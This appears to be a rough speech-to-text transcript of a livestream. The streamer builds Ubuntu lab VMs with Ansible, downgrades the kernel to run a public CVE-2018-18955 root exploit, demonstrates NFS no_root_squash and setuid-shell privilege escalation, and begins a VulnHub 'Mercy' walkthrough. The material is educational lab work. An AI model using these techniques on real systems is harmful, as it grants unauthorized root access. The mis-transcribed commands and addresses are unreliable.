 let's see looks like it disabled the chat I'm just gonna do that let's see click it again there we go and now is it 1080 it looks like it is okay so we got the 1080 that's fixed let me pop out this jet since it seems to have changed okay what version of Cali I have no idea honestly whatever I have installed so for this video we are going to be using Ubuntu and I have a template that we're going to use ansible with to deploy so if I go to actually yeah let's just do it this way so if I give my OS builds I have Ubuntu server and if you don't have V Center you'll be able to do this once you get Ubuntu installed and you can do a bunch of snapshots so you can convert to virtual machine and we're going to create this and now this is a VM we're gonna power it up I'm going to login change the password and then we will go back to a template and downgrade this downgrade it being we're gonna go to a different kernel so let's allow pop-ups just logging in if I can remember what pass where I have on this okay let's change it I'm not gonna do container especially because we're going to be going to do a kennel presque so the container won't really work for that I'm also just not a huge fan with containers in general vSphere is a ESX management utility it allows you access to some API to do some things so what you're about to see is we're going to have a script that will automatically build us a Linux box so hopefully people switch to the new stream I don't know really how to fix that one I assumed when I stopped and started again it would automatically load the new one so we shut down the server and we're just going to convert this back to a template so template convert and now let's go and learn what ansible is so ansible is just going to be automation utility it's going to essentially SSH into the box and do a bunch of things to order configure so once we build out a thing we want to prove a skin in this Linux then we're going to convert it to a ansible template as sound in static and sound is anyone else having static hold on let's see audio is fine for other people okay so ants will just make it so we can deploy the vulnerable configuration on the VM at other times so to install ansible we need to do think app search ansible is it in Kali I've never actually installed on Kali it looks like it is so we can do it 3 install ansible and do it this way as well okay yeah you can do it through pip or apt I'm preferring to do it through pip just because I think this is how I did it in the past so once we have ansible installed then we can create a ansible config the other things we're going to need is PI V mami or what have you pronounced that this is going to be the Python library to interact with v center or ESX so once we get this and then we can begin with the script so we can also go to Google and search for ansible deploy V Center also going to add provision in there because I think that's another good key log keyword so let's see PIPP ansible pi v mami and then here's a sample thing so this is essentially what we're doing so now that we got ansible installed we're going to do PI V mommy we need to pip3 and now we can do or secrets file so I've already created a template secrets dot yeah mol so if we look at what this file is this is just going to be variables that's going to be used in the scripts and the reason why I'm showing this is because I'm not actually going to type it out because I just don't feel like putting the actual passwords I'm going to be using this was just a beer I was drinking while I created this one this is a lab so I'm going to copy secrets Campbell right here I knew I leaked that but thankfully I have a temporary password in there that's where I was going to change before I started this dream what are we trying to do again we're just creating an automated thing to deploy Linux and then once we do this the videos probably can make a lot more sense but I want to create the automation step from beginning to end so we have secrecy amyl and we need to create a playbook and we can go over exactly what this does I'm going to go to a slightly modified one I already have so we can just copy this hold on I know you can't see this so we're going to call this provision Gamal and I'm going to base this this is essentially the same thing as this script it's just going to be slightly different so we have host localhost and that's because it's going to be using this host to login to V Center gather facts we're going to change this to know if this is set to yes when it logs into the remote box it pulls a bunch of environments from it so just like current user name host name what OS it is thank you a meal for the donation did anything pop up on stream or not I'm just curious but we got oh there it is so variables C juice camel that's going to contain all these variables and I showed you in the example script I'm not creating a box for hack the box this is just going to be for learning so this is going to log in to V Center which is this thing and then VMware guest validate certs that's fine and here it is creating the box and ansible does loops a little bit weird so I have the loop all the way down here it's going to run through this set of codes for every item in this and the reason why I do this is just so it's easy to provision a lot of machines so I'm going to create this hostname as Ubuntu - oh 1 and the OS we're going to specify it is going to be the template ubuntu - server - 18:04 so ubuntu - server - 18:04 and the IP address I want to give this is going to be let's do 60 and I'm just going to copy another line because let's deploy two boxes so you can see the benefit of doing this so just getting rid of that blank line so now if I just do ansible - playbook provision and then secrets Tamil that is that file that contains all the credentials let's see if it works so it's doing V Center login it worked it's saying clone the template if I go back here we can see it is making a machine right here and now the machine should be powered up so if I go to Ubuntu o1 we can look at this web console and now we just got a machine it's going to reboot this because it just set all the IP information so if we go back to this playbook for vision Gamal we told it to assign the IP 1030 0-60 so that's why it rebooted ansible already knew how to handle this to create the configuration file to create this network so once the machine boots up it uses vmware tools goes into the machine and then pushes the new file to give it a static IP reboots it and then when the machine comes back up it's got an IP address so now i should be able to ssh to 1030 0-60 as if sec and this is an old image there's one bug right here that i guess it just didn't take when you work in templates and doing vmware clones you have to kind of make sure the machines is at a decent state and I thought this would have been executed so I removed all the ssh host keys so I was hoping when the machine builded up next it would automatically generate a new SSH house key but it doesn't look like it did that so I'm just going to manually do that and then we'll look at that in a little bit exactly why it didn't so pseudo it's going to create the new key so now I should be able to SSH to this box and we have a fresh install of Ubuntu so if you're confused or you don't want to do all that if you just get a Ubuntu machine to this point we can go forward I figured I just do that one so while we wait for people and the people out here get some content let's see did the link I send out hell hold on I'm gonna link the new thing because I see why people are in the old chat or the old stream let's see okay so if we go back to this we can actually see it did create Ubuntu o2 and that has the IP address of 10 30 0 61 so created two machines we don't need that second machine that was just showing you what that would do so what I'm going to do is create a snapshot right here and we're just gonna do fresh install ok so now we can work on showing the probe ask the very first one I'm going to do is we can go over what I have so far hold on let's see this is a part of a presentation I'll be doing in the near future sudo we don't want to do that kernels so let's do this CVE 20 18 18 9 5 5 profess so if we look at a kernel right now we are running the latest or somewhat latest February 20 20 the CVE we had pulled up was from 2018 so that's not going to work because we'll already patched so we have to install the old colonel on this machine so what we're going to do is google ubuntu old kernels and let's see install I'm just looking for the location of all the kernels are so kernel dot ubuntu.com squiggly colonel - PPA main line and we're not going to do precise because that's a Ubuntu distro we're just gonna go back to main line and we have all of these kernels so we want to pick one that is somewhere in 2018 because that's the previs we want to do so I'm going to grab this and we're going to search the CVE with launchpad and see if it tells us what version this was patched in because we want to install the kernel before that so let's see 2018 somewhere in November so let's go back here you name - eh we're on kernel 4.15 so I'm going to do search here v 4.15 and we're going to pick one that is before november so let's do four one five one eight so this kernel should be compatible and we want to build for amd64 because our machine is 64-bit and we're going to copy these so the first one is going to be the all and will have to be root so sudo su I just typed the wrong password okay so we're just going to download the files copy the whole thing oh let's see unable resolve host address link location so we want to download all generic and then this one the Linux image generic we don't need the low latency and then we'll download the last one and then it's as simple as oh I download this one of them twice so we have image headers headers all and we don't have headers generic copy link to location there we go so now we have Linux headers all Linux headers generic and Linux image generic so I'm just going to install this with D package and then while that installs I'm going to down these files to Kali because we want to automate this with ansible so make dur we'll just do [Music] kernels and W get each of these so now we have each of them what is going to reboot and see if we get to a old colonel so again you name - a we see February 20 2000 flee when we reboot we go down to 2018 so King 10:30 0-60 and we'll wait for that to come back and check on chat okay so let's login to this box and see if we did it correctly you name - eh we are now on a 2018 kernel so this one should be compatible with this exploit so we were trying to do CVE 2000 1818 955 so if we just Google this let's go to Linux kernel exploits and let's download this so we probably should clone the repo copy link W get and then we're probably gonna need GCC and unzip so let's do sudo apt install GCC unzip let's see sudo apt update and then install these two I'm just making sure it's not going to install the a more up-to-date kernel by reading this real quick looks fine uh yeah I do a lot of sysadmin type work outside and some development outside of doing videos Emmy so let's unzip master let's see put it here 2018 CBE 2018 18 955 so I just chose this exploit because it's relatively new we could have done like Full Nelson mmmm / dipper dirty cow or this one I was just giving common kernel exploits in this slide so let's do exploit Kron SH and see how this works so this one is going to create a entry and Etsy crontab so before we do this let's SSH to this box again hips ik at 10:30 0-60 okay and let's run exploit cron so it's executing the sub shell so if we do cat Etsy crontab we can see this had created an entry in there to execute this command if we look at this command it's going to CH own route route on temp SH and give it a set UID bit and I'm guessing it's going to execute it so this would be the first one and then after we do this we're going to revert the Machine and try to make an ansible script to automatically do this or we'll do a vote we'll move to the next one or go back and automate this to deploy it so how do you want the thing to be do you want to go through all the exploits first or go through exploit learn how to do an enhancer Bowl so you can copy it in a lab and then go to another one so what do people in chat one so we can see we are now route successfully downgraded the kernel my education I don't really have one I never went to college I just went into the workforce out of high school and then self-taught pretty much everything else so ansible automate automate so two people's they automate so it looks like a lot of people want to do automation some people want exploits but we're here to learn how to do more than just exploit eventually when I do this presentation and finish all the slides you'll have all the exploits at once so let's now go back and learn some ansible one of my specs of a ESXi host it's um let's see go to Firefox it's pretty beefy I think this one is it's a dual-core xeon with a hundred and sixty four gigs of ram another dual-core xia and two xeon processors i think 10 cores each i don't know exactly where to go to see that probably mandra now i'm sure there's a place to go and feel like clicking all around in v center so let's go back to our Ubuntu machine and let's revert or a snapshot snapshot revert to latest so this is before we did anything with the kernel so in order to create a role for box you need ansible galaxy so we do pip3 install ansible galaxy and this is going to create a skeleton for us what do I have it already know I already have it so would do an it and the role is going to be we'll call this downgrade kernel so what that did was created a bunch of folders for us each of these mean something the main one I touch is tasks verse four variables and files so let's create our let's call this please subscribe dot y Amal and we're going to create a playbook so let's see oh let's do ansible playbook example and show into play books let's see by ansible - examples of what we want will this work on VMware Pro well the beauty is the only piece that requires like vCenter or I mean requires the I guess I don't know I'm trying say the first piece of the video when you provision a machine that is going to require something more than workstation you could probably go with vagrant or something on workstation but if you want to actually provision a template you're going to need ESX and you'll probably need V Center you can also do it with like proxmox and other things V Center is just pretty clean so but after that once you have the VM you can do this with anything so all we're going to do now is this playbook please - subscribe is going to login to the Linux host and then do the downgrade for us so that's why you don't need ESX or anything you just need a Ubuntu VM ansible is a hundred percent on SSH and on Windows it can use Windows remoting which is PowerShell so where was I ansible to deploy ansible examples so here's a bunch of examples of doing things in ansible so if we go Windows you can see different services like ping let's go there Linux doesn't look like it so I'm just going to type it up so the very first thing we're going to have to do is create a inventory file so let us V Hearst dot ini you can do yeah mph for inventory but ionized are going to be the easiest learn some buffer overflow if you just go to EPS AK dot rocks and type probably overflow you'll come with videos I'm really not the best at giving examples of where to go to learn things because most of the time I learned it like ten years ago and the resource I did is kind of out of date or not even exist in so what I'm doing right now is saying the Linux hosts are going to be 10:30 0:16 and 10:30 or 10:30 0-60 and 10:30 0 61 and Linux VARs ansible user is equal to hip sack and ansible password is going to be password 1 I think that's what I did I'm not sure if I have an exclamation point at the end of it let's test real quick if set at 10:30 0 60 password 1 yep so the next thing we're going to have to do is create our actual playbook so if we go back to the I think reddit please subscribe yamo the start of every file is three dashes we can do hosts 1030 0-60 gather facts we're gonna do yes so it has all the variables am i looking for exploit development or 0 days we're not doing any exploit development of 0 days in this video this is mainly a basic one of creating a bunch of ansible stuff I guess I don't know roles and the role we called was downgrade kernel so if you went through these example ansible playbooks you'd kind of pick up the syntax so rolling update yeah mole you can kind of see how it's doing this so there's a problem that's pretty much how I learned ansible is going through the examples of things you can do in these Hamel the role that is going to be whoops the thing we had created so if we go into a downgrade kernel we can do tasks and then main dot yeah mole these going to be the tasks we actually execute so are on what we want to do is give it a name so there's going to be anything you want when I say copy files and then the module we're doing is the copy module source roll path files and I wonder if we can do a star I don't know if I can do this we're going to find out destination dev s hm let's see if I can do this we have to put stuff in the files well I do have own hub machine today let's do one or two more of these and then we can do a vote if we go to Volant up so I'm just going to put all these dot deb files and the friv ask downgrade colonel files and i just deleted it that's what happens when I talk read chat and type at the same time so thought ahead thankfully and it created that W get script to do it so we have all three files here so let's do the ansible playbook on please subscribe and we're going to give it the host ini file and let's see we need to install SSH pass what are the benefits of doing this automation versus snapshot because there's really in building this machine there's no real benefit other than you won't have to download the whole machine for me you can just join the ansible playbook and it will do it for you the main benefit to doing automation in general is just it saves a bunch of time like I have play books that will log into a machine install all my c2 software before I do an engagement or login install elastic or I even have it build out a whole Windows domain so after we do this I can see if I can show you the Windows domain stuff I don't know what's actually in it but it's just again a bunch of good stuff for automating things and saves time so now we have an SH pass installed let's run this again and see if it copies everything let's see so it doesn't look like it wanted to use the star so we're gonna have to specify each file so there's probably going to be a better way to do this but for now we're going to specify each one so source files is this and we can probably do another copy let's see source roll path files test device hm copy this let's see downgrade colonel files so here's the next file I should have went to beginning in 2d dollar that went faster and then the next one I could probably do a loop and do this one of my driving patreon back on I think patreon may have went on last month actually cuz it looked like it charged people when I thought I said it not to charge but I'll have to look into that I just noticed that before going live I'll probably turn it off again let's see so now we're on this playbook is it going to copy the three files let's see looks like it did so let's SSH we have a seiche into the box no because we reverted a snapshot CD dev s hm it only copied one so let's go back into this playbook tasks main and we'll say copy I really should have looped this Linux header all copy Linux had a generic and this will be Linux image let's try this so now there should be three tasks in this one playbook well roll so before we do this let's delete the file and run this and see what happens it looks like it is running each of those tasks now so you can see copy links that are all change change changed and I think ansible will automatically know if the file exists and it won't say changed okay okay okay so it made zero changes to the host so that's just one more benefit of ansible and thank you rekka trek it for the donation let's see going back here we have all three files I'm pretty sure you can send more money thank you Paul so if we go back into the downgrade kernel thing now what is left is executing it so let's go into tasks the main and we'll do - name install the kernels and let's see ansible D package install is there already a playbook for this D package selections let's see name Python selection hold that's not what we want let's do ansible Linux run command new command in the host let's see you record for the donation again let's see a return message a day so we just do command so command let's try D package - I dev sh m star see if that works Thank You blue Fox and before we do this I'm just going to SSH down here so we have it in the same panel and then we'll clean out the files and see if it works [Music] Thank You K so let's see if that command runs let's see it doesn't look like it worked so requires super user privilege so let's do sudo su and what I have to do is edit the studio is file to say no password on this pseudo let's see okay let's see su doors just Kelly have a syntax let's see sudo do not require a password okay let's see VI sudo all all no passwd at all and I should be able to edit this no passwd all okay so now in ansible all we do is say become yes so it's become I think true I think it's true not yes so now we run this again and we're going to see if it actually runs that command and then afterwards we're going to just reboot the box so it's copying all the files that last ones taking a while there we go it's installing and it still failed there's such file or directory so let's install each one let's CCD downgrade kernel tasks main let's see install header generic grab this this one is all generic I should do it the loop or something but we can clean it up later if that's what you guys want but this is generally just well spend a few hours a day doing to try to learn all the syntax and then go back and clean it up so let's see will this work now I can use the apt module and install a Deb I have looked at that we can try it again I'm sure you can let's see let's see app module ansible why not use digital ocean snapshots because I have V Center at home so like I can pay a monthly cost or I could just run it in my house default D package option install recommends purge upgrade so what I didn't see in this module K was specifying the exact file so that's why I didn't go with this in most cases I would because you're just installing it out of apt but I don't know if I do name and provided a dot Deb file if that would automatically install it so the store Deb did not work however doing them individually did so if we do you name - a it is the 20/20 kernel so if I reboot this we will see Ava downgrades I probably won't be showing doctor there's a Deb module do you name - a and it's downgraded the colonel so there's one way and void said we can do one thing which I want to try real quick so let's revert the snapshot and then see if we can get it working with the wild-card Ubuntu snapshot revert yes I'm not gonna do a heavy red team stuff streaming let's see okay say you have a Deb option in the apt module sometimes reading is hard there is what do you know so let's try this this could be a bit better so downgrade colonel let's see get to knit sweet get commit or will do get add everything we probably should have done get ignoring secrets yeah Mille but oh well get commit - M initial with installing kernel so that's another good thing about ansible is you have change control let's see so we go to tasks let's go to main and let's get rid of these commands I'm going to do install the packages and then we're going to use the apt module and then we'll try Deb and then specify the path there's one man sometimes I hate when it doesn't format correctly and he'll be a third so we'll see if this works we're going to have to log back into the box and edit the pseudo file avoid I think that may work so let's try this unable to install package cannot open file no such file or directory dev sh m let's see does this file actually exist file exists not sure what that error message about if you've ABARES Flags see and then I try doing just one downgrade colonel tasks let's look at this a colon slash slash would attempt to download dad before installing wonder if I need to do like file slash slash remote source and app tag I'm not sure what the remote source tag is someone saying it's looking at my local machine so that's a simple fix let's just go to my local machine and test so kernels downgrade kernel files CP ster - dev s hm and I really hope it doesn't now install it on my host machine which it shouldn't do can I open file no such file so that didn't work so it's not pulling off my host machine try this and then we do single single is in a single package failed downloading so it didn't want that let's give it just one yeah I'm only straining on YouTube so let's not do it in the list format so I think it just didn't want it as the list yep so now it installed it so that was the issue there so let's see how do we install multiple packages why am i downgrading the kernel so a kernel exploit works let's see ansible install multiple deb packages feature request allow multiple deb multiply one install them all with this name let's see copy Deb with items let's see source item so let's try updating her script real quick cuz this looks good that would go over let's see so we're doing copy items action copy gonna see if this works source see item destination item okay try renaming files yeah we'll try that right after this maybe it is one of these so sin it's super easy to downgrade kernels like in a command line like I don't need to use QM you doing it through automation is what makes it difficult so let's see with items will do Linux would do header - generic Deb Edo - all Deb and image - generic Deb is that what you wanted me to rename the files to whoever it was so we can try doing this the same thing action happed will try this egg's item see if this works if not we'll probably just move on and do something else because we had it working and then we just tried to optimize it so tasks let's do files Linux headers what is it saying I'm just core now 1 8 4 4 5 0 - this will be headers gasp generic Deb Linux headers 4 5 this will be that is all Deb this will be image Deb tasks main gamal headers headers we just said image okay so we can try running this again see if it works if it doesn't we'll just move on so it looks like it's copying each of those files and there we go so now we have it working a little bit more optimized so it just installed headers - all their spotty can be one that it doesn't change probably this next one because I think we already had installed it so let's see it's gonna do the next one would it just hang nope there we go so it looks like it worked we do you name - eh we are on the 2020 colonel so let's reboot stall and then we have it so we're now downgraded and we have a playbook to do that so in the future if we ever wanted to downgrade the colonel again we have an automated way to do so so let's look at the next thing we want to do so pulling up presentation I'll start from the beginning of this and go over what the plan is so this is a guide I started a long time ago and then kind of stopped so it's kind of halfway done we'll go through it so we're gonna start off with hindsight doesn't have to be 20/20 when you begin doing this data is more important than privileges before you ever do a probe ask you should ask yourself why because probably nine times out of 10 when I get on a box I don't need route I just need data so if I pop a web server chances are I can access the database and all I want to do is a database dump and decrypt passwords give me route on that web server probably not gonna buy me that much I could do things like backdoor SSH and capture clear text passwords when people walk again but again may not buy me anything if I can just access the database get the passwords that way and decrypt them it's a lot less noisy to not profess k-- of i will add a reboot command to the end so whenever you do a probe ask keep it simple so knowing if something is exploitable makes life ten times easier than if it doesn't so you're just avoiding any complex what I mean by that is when you do an exploit try to create a file and not do a shell if we go back to the CVE we had just done let's go move here like probably a half hour ago or something we did a CVE oh man my firefox is going slow I just hung my VM weird let's see we did this 20 18 CVE the latest one on this Linux kernel exploits thing and we exploited cron it wrote an entry into the crontab but it didn't write a whole shell you could probably do like a bash one-liner to get a reverse shell in a content I know you can we've done in videos what it does is it copies an entry to execute a file which then does a sticky bit on another file and then goes and executes that file so that's three different steps so if something fails you have three places to debug it if you try to do a shell and it fails you're like well did this fail at the network stack did it not execute at all I have no idea what just happened so like let's just do this real quick and we can see all the things it does again it's not going to be the most OPSEC friendly thing because it's got like five or six tasks it caught on but in hindsight if it fails you know exactly where it failed and can start debugging so we have to do app to install unzip and what was the other one GCC because we have to compile something app update so now we can install these it's already been an hour streaming well I made like no progress so come on finish bossing these triggers we probably don't have to wait for it but it's gonna finish soon as I walk in I know it it's a cat 10:30 0-60 password1 and we can W get come on go here copy link so now we go into the exploit eight one eight nine five five and I want to run this at the top of the minute because it creates a con entry to run every minute so if I do it right at the top of the minute then we're going to have the most time to look at what it does step by step so give it another 15 seconds and then we will run it come on okay it's a new minute so when we do a cron we have about 50 seconds so week at Etsy crontab we see okay we got a file right we know we can write to a file because we wrote to this con Tam this crontab if we look at the permissions only root can write to it so we have one thing there we wrote tenth payload what is tenth payload going to do it's going to run CH own route route on temp SH and then give temp SH the sticky bit so if we look at temp we got SH as well SH is just a shell but it's an elf file and looking at it it doesn't have the sticky bit yet so we're just going to wait we'll just do date oh it should have it now so if we do LS LA on temp SH there it is and it has that nice to keep it set UID bit so keep it simple we have a lot of things to troubleshoot it helps when you're doing SQL try like a single quote double quote and one a comment and just see how the behavior changes if you go straight into doing Union injection you may hit something unexpected you may fail that syntax as we did last dream there's a bunch of things you could fail that start simple work your way up and then you have the website if sect out rocks to help you how did I fix the losing the IP in the last dream I just have a static IP now so all I did was go in my Cali the network setting and set a static IP when do recon go down the entire list don't just see the first thing and then try to pop a box like if you do like Lynn peas the very first thing that's gonna show up maybe the kernel but you may have a like GTFO bin you can just execute to get root and if you try going down the kernel path you may crash the box so always review everything before trying any type of probe ask so in recon manually a few good things to do you name - hey this is gonna show the kernel find / - poem - 4000 that's gonna set show set UID files SS - L NTP it's just like net stat it's gonna show open ports deep package - L or if you're on Red Hat or p.m. this is going to show all the packages installed and then if all else fails it's always handy to run fine / - LS take you a list of every single file because what you're looking for may be odd maybe you'll find like slash home slash user slash my secret password dot txt you never know so scripts I love using linen oom Lyn brave checker smart Linux enumeration and Lin peace Souter - L will get into that under quick wince groups know what each group can do like a DM reads logs and if you can read logs of a box you may want to check the SSH off to see if someone tried logging in with their password you'd be surprised how often you see that dr. Alex C if you remember these groups you can almost always prove asked so that would be a demo we're not gonna get into that demo now cuz it can take a little bit to set up so quick wins this slide I just used xkcd a for everything because it kind of shows how quick this slide was to make I guess sudo su - shell GTFO bins versions this we were we did the CVE 2018 let's see library they're showing always go into like PHP applications Java applications etc and see what the package is for instance image tragic you can maybe update that and apt on I think that's pro - image magic I think is the library but maybe the web application was bundled with an older version that it's using and it may still be vulnerable so nothing their missions how they work so if you ever wondered hat what like seven five five means just check so it's adding so execute one write is to read is four so if you add all three of these that's seven if you want read and write that's six if you want execute and read that's five and again if you're ever in doubt you can run the stat command against a file and it will tell you everything about it so we have this set UID file that's for if you remember was defined - four thousand that's why because we wanted to know this one then you got seven seven five so read write execute read write execute and then five is going to be whoops read and execute if you can write files here's some good locations to write to if you write anywhere here you can gain route like adding someone into the sudoers file adding an SSH key etc set UID Linux capabilities getting into that haven't done their slides let's see we may be overdue NFS real quick so this was done in the jail video so let's do sudo su V at C exports don't have it let's see Linux setup NFS version 2 or version 3 I think it's for that has authentication setup Ubuntu suite here we go so we're going to want to stall this NFS - Colonel - server app install yep and then create the export directory make - mount NFS an NFS stands for network file system it's like remote file share and version 3 doesn't do all 10 ocation so edit it's the exports the Etsy exports see I think that'll work yep so systemctl start n FS and FS - Colonel server and if you want burp to go to public servers you just have to add this CA certificate so if you go to HTTP colon slash slash / CA certificate save file type SSL in the search no type certificate in the search view certificates and then get our authorities import your burps and then allow it to identify websites and then you'll be able to go anywhere with birth the VM is going to be shared with patreon and I'll probably have the ansible stuff shared with everyone so you'll have to learn ansible to be able to do it for free but if you just want the VM it'll be done with patreon I could do an able to make it persist but I don't want to right now so do we have show mount - a No - II for export 10:30 0-60 export lists not being shown one of export list is disabled mount - t 1030 0-60 now NFS slash mail access denied the Etsy exports what is screwed-up config eat zero let's just do 172 1610 0/24 and we're going to restart the service there we go so now this is exposed to me if I try to mount this CD / mail Dutch test doesn't look like they wanted to create stash II which is not specified - t 1030 0-60 / male it's not working mount fresh T and I fast let's do - o ver Z equals 2 for version - where is equals 3 we can write here we can see it ok so at least now we're getting a error message so let's go back in the exports so readwrite sync no sub tree I wonder if like squash root is on by default let's see cat let's see we do mount it's mounted a read write so doing the mount - Oh won't really do anything so let's go as let's do user add hip sack s you Det will mount this again su - EPS AK c / mount touch testing permission denied let's see why is it giving permission denied so I don't think it's the squash root anymore because version three I don't believe has authentication I think it's version 4 which they added that and I'm UID 1000 on both ends so let's see wait there's one thing that could have screwed that up chmod 777 NFS because UID 1000 couldn't write to this folder there we go now is it so NFS right now has a squash root on so let's see disable squash root no underscore root squash so what root squash and NFS means is any time it sees UID 0 it puts it to the nobody user so it essentially rewrites root to nobody so now fixing this we you mount / male mount it again CD / male LS touch test three so the pre vest vector with NFS is I can't execute files with this like in this window I can't execute a file I can only read and write so the trick is you just create a file and give it the set UID bit so let's do which VI CPUs herb and VI to mount NFS we go in here and then on this end we do LS la CH own route route to VI and then chmod plus is it s VI to give it the set UID bit and now on this end we can take advantage of that so we can execute VI and then in VI if you ever do : exclamation point you get exit commands and it didn't put us as root so I'm guessing this version of VI is not doing a set UID chmod for 7 5 5 VI yeah so that one's not doing a set UID call let's see do we have the Linux kernel exploits let's take a look at what one of these was do we have a shell root shell dot C let's see what that is yep let's just compile this so this is just a C program that's calling set UID 0 set GID 0 and then executing bash so GCC root shell dot C - OH we'll just call it shell and we'll copy shell to mount NFS and then chmod a CH own root root on shell and then chmod plus S on shell so now that is set UID as well mount and a fast dot slash shell and we a root someone wants to say SH let's see is this just symlink t' this is symlink - - so I think - normally lets you so Ben - we can try this one CH own root root - chmod plus s - plus s this one's not doing it some Linux distros will automatically not put those set UID binaries and things so it looks like this version of Ubuntu they earned it that way so like - and VI they won't do a set UID call at the start so you just drop your own but is there anything else we want to get into do we want to keep doing this we can either automate installing NFS we can do a Vaughn hub machine or we can look into other privacy so just waiting for to see what people say there's a small delay let's see I can type in and chat one presence at Vaughn hub as well said on other probe asked Vaughn hub Vaughn hub Vaughn hub Vaughn hub okay so let's figure out if on her machine to do or on one sec okay if you want dr. xscape then just go to epic dot rocks I'm not doing API testing there's no need to spam so looking at the machines we have we did dc9 we did mass crafter so let's see bravery mercy for development how do those three what do you want to do if you want to see LXE darker etc escapes there's this great website that if you do if SEC dot rocks and type in doctor you'll find stuff relating to docker so let's see one two three four it's looking like we're going to do mercy so let's see let's power this machine on and I'm gonna make sure Ethan one is connected I just only connected that looks good okay mercy when a login prompt network let's turn it to host only and just reboot this machine for good measure why here's only it's just the network where my machine will talk to this one hub machine I could use bridge but I don't want to put a VM I've not validated on my network that can talk to everything else so host only means that VM isn't going to be able to talk to machines outside of my computer so it won't be able to go to the Internet give someone a reverse shell and do badness th client - I won I don't know why I got that one send me to address come on sometimes I really don't care for the Cali or the new version of Cali I don't really take a question what to do videos for credit I'm pretty sure if you go look at if SEC dot rocks you'll find what you're looking for there let's see there we go now it's Ramon DHCP I'm about to just statically assign this interface there we go finally have an IP so UPS can interface eath one four nine to 168 48 0/24 and we'll see what Mercy's IP is so I'm guessing mercy is going to be 192 168 48.1 34 so let's start off with the end map so let's make Teran map and map - I see four default scripts that's V enumerate versions okay I'll put all formats put in the M map directory and call it mercy and then the IP address which is 192 168 48.1 34 I'm actually going to cancel this out real quick and do a - V flag for verbose so it shows me up imports as it finds them we see 139 99-93 110 53 so a bunch of ports are open I'm gonna do a second end map with all ports so n map - P - to do all ports that's ports 1 through 65535 I think or 34 it's a metric ton of ports so do that we're not gonna do any scripts because that would take a while we'll do - Oh a put this in mercy - all ports and then the IP address and beforehand I'm gonna do sleep to be hundred - wait five minutes before I run this ed map because if I don't do that then well I'll have to and maps going at once and they could collide and provide false results so while we're waiting I guess we can just take a look at what services we have um 8080 looks super familiar so we can start off with that one for four or five as well we could ping this box 192 168 48 134 and since we see 64 we know this is probably going to be a Linux box because the default TTL on Linux is 64 Windows is 128 and Cisco is 254 I believe so if you see a TTL between 65 and 128 chances are you're dealing with a Windows box if it's not that then probably Linux so thank you for the donation wreck it wreck it for both of them so let's just do SMB client - capital L 1 i2 168 48 134 to see if there's any anonymous any ports are open we do have a Qi you share so what I'm going to do let's go to cherry tree and take some notes so mercy notes SMB qi u / qu y qi u so let's do melt we can do SMB client 1 i2 168 48 what was it 138 134 / qi u and we get access to died we can try - and four I think null session it doesn't look like that worked but doesn't really we can access it so it's just showing us the share is up and map script has finished so let's go and take a look at all the ports we do have DNS so what we could try is dig + axfr at one I to 168 48 134 actually we need to know a Tod or something to do a zone transfer so let's just try NS lookup server 1 i2 168 48 134 whoops server 1 i2 168 48 134 and try looking up who the server thinks localhost is it says localhost we can try a 0 0 2 don't really get anything so I'm trying to get the box torque off up its hostname if it costs up its hostname we may be able to do a certain transfer or something we do see port 22 is filtered so I'm guessing there may be some type of port knocking because von Hub likes doing port knocks and it being filtered means it's behaving differently 80 is also filtered curl this so further there's a filtered we have pop which is unique so it's got some type of mail 8080 is Tomcat so let's go over to what I do 168 48 let's just close a bunch of these tabs come on my VM song right now I'm probably gonna restart burp suite I bet that's eating up all the memory on my VM or I'm a reboot this VM okay I don't why you better so 192 168 48 134 and we wanted to go port 8080 let's see we get tomcat and robots.txt gave us last try her to try harder so let's check this out Thank You Rekha and it looks like we get a bunch of base64 so let's check what this is echo - add base64 - D I'm just gonna echo again let's see cyber hygiene is extremely important stop setting silly passwords that will get cracked with any decent password list once we found the password password quite literally on a post-it note in front of a employees desk as always it may be the employee pleaded mercy when we threatened to fire her so what I'm going to try to do is login to SMB with that cue I you user so SMB client let's go back here and I think it's - capital yield let's just try username password is this password password it works so what do we get from this duck bachelor see bash history is 163 so let's get this file so we can exit and then we cat bash history and let's see home qi u dot secrets Open Sesame so this is looking like a port knock Thank You zero day thank you some guy in Sandy for all the donations so didn't try this type the password is password again can we do CD dot dot to get out of this doesn't look like we can there is a dot private directory and this is where everything is so let's do get readme text CD secrets nothing CD Open Sesame get config print get config and we got a few files to go through there's a few if eyes only if we cat config this looks like the SMB config so let's see open HTTP so here's the port NOC sequence so one fifty nine two seven three nine one four so let's try this or do NC 192 168 48 134 159 then we'll do two seven three nine one and then four and now we will curl it and we get a website awesome so let's go here this machine shall make you plead for mercy that's annoying /q I you nothing I was going to get to his home directory so what I'm going to do is start a go Buster because we always want to do some type of recon in the background so go busted dir for der mode HTTP 192 168 48 134 - w-4 word list user share word lister buster directory list 2 3 medium - oh for alt I'll call this go Buster - root slash time system time time courtesy of Linux tiny equals 1 nope maybe time zone equals 1 so there may be some type of parameter on this time script to change the time zone that we may be able to exploit but I don't know anything else yet so let's take a look at what the rest of this config file is we got OpenSSH so we could try OpenSSH and logging in with the QI you user that sounds like it could be fun so copy this I think that's a raise who donated that time so one I to 168 what is at 48 134 one seven three oh one - 8 5 / 4 + 9 9 9 9 sh q iu at that IP yes password of password don't get in password with Qi Yi we don't get anything as well so nothing there here's the Apache config Thank You Lloyd for the two-pound donation or two heroes I don't actually know what that sign is I get pounds in yours confused so much [Music] seedot htaccess could be good never probably on a go Buster SMB config see printers Qi you so Qi you is read only in SMB so we can't really drop files let's do config print what is this settings port knockin nothing too interesting there there's one file we I thought we got but we didn't let's just organize a little bit I'm making duress MB and moving the files I downloaded via SMB to that directory and we'll do SMB client - you Qi you 192 168 48 134 /q il password dir if we go into private Open Sesame okay secrets nothing here I'm not gonna put my command history Reckitt let's see it only showed time so now I'm doing a PHP search let's see sit slash probably slash manager for Tomcat is it admin admin tomcat tomcat admin tomcat let's search tomcat default password looks like when i was fooling around with my no exciting's i got rid of the dns entry so admin tomcat manager manager we can try those I'm in Tomcat manager manager Tomcat s3c ret qyu password let's see what percentage are you done with this box I've never done this box so I don't know let's see patchy two four seven actually now that we have 22 open you probably get what OS this is let's see to you what Ubuntu is this oh this is Ubuntu trusty trust he's pretty old let's see show a shock POC come on guys we just do shellshock or dot pi user agent sure this looks fine so I don't think it is shellshock say use AB in sleep so probably not shell-shocked let's see there is mail so do we have Thunderbird installed apt install Thunderbird since pop was also on this if we look I have a note to check the mail so I'm going to install Thunderbird and see if we can login to his mailbox and see if we can poll emails and then I guess while we do this we should run and map again so n map - P 2280 because these are the two ports that we have opened after port knocking c sv o a and map actually let's just do them 